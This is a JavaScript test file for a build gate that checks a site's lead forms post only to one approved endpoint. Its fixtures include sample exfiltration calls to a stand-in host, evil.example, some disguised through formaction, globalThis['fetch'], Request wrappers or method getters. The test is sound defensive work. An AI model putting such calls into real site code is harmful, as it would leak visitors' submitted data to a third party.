import assert from 'node:assert/strict'
import { compiledLeadEndpointPresent, leadArtifactFileAllowed, sourceLeadTransportAllowed } from './lead-artifact-gate.mjs'

let cases = 0
const check = (actual, expected) => { assert.equal(actual, expected); cases++ }
const endpoint = 'https://banger.su/leads.php'

check(leadArtifactFileAllowed('index.html', '<main>contacts</main>', false), true)
check(leadArtifactFileAllowed('index.html', '<form></form>', false), false)
check(leadArtifactFileAllowed('contacts.html', '<section data-release-profile="online-leads"><form></form></section>', true), true)
check(leadArtifactFileAllowed('contacts.html', '<section data-release-profile="visual-contacts"><form></form></section>', true), false)
check(leadArtifactFileAllowed('contacts.html', '<section data-release-profile="online-leads"><form action="https://evil.example/submit"></form></section>', true), false)
check(leadArtifactFileAllowed('contacts.html', '<section data-release-profile="online-leads"><form method="post"></form></section>', true), false)
check(leadArtifactFileAllowed('contacts.html', '<section data-release-profile="online-leads"><form><button formaction="https://evil.example/submit"></button></form></section>', true), false)
check(leadArtifactFileAllowed('static.js', 'https://banger-leads.onrender.com/leads', true), false)
check(leadArtifactFileAllowed('static.js', 'https://banger-leads.onrender.com/leads', false), false)

check(compiledLeadEndpointPresent([{ path: 'chunk.js', content: 'const n="https://banger.su/leads.php";fetch(n,{method:"POST"})' }], endpoint), false)
check(compiledLeadEndpointPresent([{ path: 'chunk.js', content: `fetch("${endpoint}",{method:"POST"})` }], endpoint), true)
check(compiledLeadEndpointPresent([{ path: 'chunk.js', content: `fetch("${endpoint}");` }], endpoint), false)
check(compiledLeadEndpointPresent([{ path: 'chunk.js', content: 'const n="https://evil.example/submit";fetch(n,{method:"POST"})' }], endpoint), false)
check(compiledLeadEndpointPresent([{ path: 'chunk.js', content: `const n="${endpoint}";fetch(n,{method:"POST"});fetch("https://evil.example/submit",{method:"POST"})` }], endpoint), false)
check(compiledLeadEndpointPresent([{ path: 'url.js', content: `const endpoint="${endpoint}"` }, { path: 'fetch.js', content: 'fetch(n,{method:"POST"})' }], endpoint), false)
check(compiledLeadEndpointPresent([{ path: 'dead.js', content: `// ${endpoint}` }], endpoint), false)
check(compiledLeadEndpointPresent([{ path: 'dynamic.js', content: 'fetch(target,{method:"POST"})' }], endpoint), false)
check(compiledLeadEndpointPresent([{ path: 'chunk.js', content: `fetch("${endpoint}",{method:"POST"});fetch("https://evil.example/submit",{method:currentMethod})` }], endpoint), false)
check(compiledLeadEndpointPresent([{ path: 'chunk.js', content: `fetch("${endpoint}",{method:"POST"});fetch('/api/collect',{get method(){return 'POST'}})` }], endpoint), false)
check(compiledLeadEndpointPresent([{ path: 'chunk.js', content: `fetch("${endpoint}",{method:"POST"});globalThis["fetch"]("https://evil.example/submit",{method:"POST"})` }], endpoint), false)
check(compiledLeadEndpointPresent([{ path: 'chunk.js', content: `fetch("${endpoint}",{method:"POST"});fetch(new Request("https://evil.example/submit",{method:"POST"}))` }], endpoint), false)
check(compiledLeadEndpointPresent([
  { path: 'dist/_next/static/chunks/lead.js', content: `fetch("${endpoint}",{method:"POST"})` },
  { path: 'dist/_next/static/chunks/1255-test.js', content: 'fetch(e.canonicalUrl,{method:"POST",headers:{[o.ACTION_HEADER]:p}})' },
], endpoint), true)
check(compiledLeadEndpointPresent([
  { path: 'dist/_next/static/chunks/lead.js', content: `fetch("${endpoint}",{method:"POST"})` },
  { path: 'dist/_next/static/chunks/main-test.js', content: 'fetch(t,{credentials:"same-origin",method:n.method||"GET",headers:Object.assign({},n.headers,{"x-nextjs-data":"1"})})' },
], endpoint), true)

const sourceFiles = [
  { path: 'src/lib/leads.ts', content: `const leadEndpoint="${endpoint}";fetch(leadEndpoint,{method:'POST'})` },
  { path: 'src/lib/model-pdf.ts', content: "fetch('/fonts/font.ttf')" },
  { path: 'src/components/Weather.tsx', content: "fetch('/weather/city.json',{method:'GET'})" },
  { path: 'src/components/forms/OnlineLeadForm.tsx', content: 'async function submit(){ await sendLead(lead); } const form = <form onSubmit={submit}></form>' },
]
check(sourceLeadTransportAllowed(sourceFiles), true)
check(sourceLeadTransportAllowed([...sourceFiles, { path: 'src/components/BadForm.tsx', content: "fetch('https://evil.example/submit',{method:'POST'})" }]), false)
check(sourceLeadTransportAllowed([{ path: 'src/lib/leads.ts', content: `fetch("${endpoint}",{method:'POST'})` }]), false)
check(sourceLeadTransportAllowed([{ path: 'src/lib/leads.ts', content: `fetch(leadEndpoint,{method:'POST'});fetch('https://evil.example/submit',{method:'POST'})` }]), false)
check(sourceLeadTransportAllowed([{ path: 'src/lib/leads.ts', content: 'const request = fetch; request(url, {method:"POST"})' }]), false)
check(sourceLeadTransportAllowed([{ path: 'src/lib/leads.ts', content: 'const xhr = new XMLHttpRequest()' }]), false)
check(sourceLeadTransportAllowed([{ path: 'src/lib/leads.ts', content: 'navigator.sendBeacon(url, payload)' }]), false)
check(sourceLeadTransportAllowed([{ path: 'src/lib/model-pdf.ts', content: "fetch('/font.ttf')" }]), false)
check(sourceLeadTransportAllowed([...sourceFiles, { path: 'src/components/forms/BadForm.tsx', content: '<form onSubmit={submit}></form>' }]), false)
check(sourceLeadTransportAllowed([{ ...sourceFiles[0] }, { path: 'src/components/forms/OnlineLeadForm.tsx', content: 'const form = <form action="https://evil.example/submit" onSubmit={submit}></form>' }]), false)
check(sourceLeadTransportAllowed([...sourceFiles, { path: 'src/components/BadForm.tsx', content: "client.post('https://evil.example/submit', payload)" }]), false)
check(sourceLeadTransportAllowed([...sourceFiles, { path: 'src/components/BadForm.tsx', content: "form.setAttribute('action', 'https://evil.example/submit')" }]), false)
check(sourceLeadTransportAllowed([...sourceFiles, { path: 'src/components/BadForm.tsx', content: "fetch('https://evil.example/submit',{method:currentMethod})" }]), false)
check(sourceLeadTransportAllowed([...sourceFiles, { path: 'src/components/BadForm.tsx', content: "fetch('/api/collect',{get method(){return 'POST'}})" }]), false)
check(sourceLeadTransportAllowed([...sourceFiles, { path: 'src/components/BadForm.tsx', content: "globalThis['fetch']('https://evil.example/submit',{method:'POST'})" }]), false)
check(sourceLeadTransportAllowed([...sourceFiles, { path: 'src/components/BadForm.tsx', content: "fetch(new Request('https://evil.example/submit',{method:'POST'}))" }]), false)

console.log(`Compiled lead artifact gate: ${cases} cases PASS`)
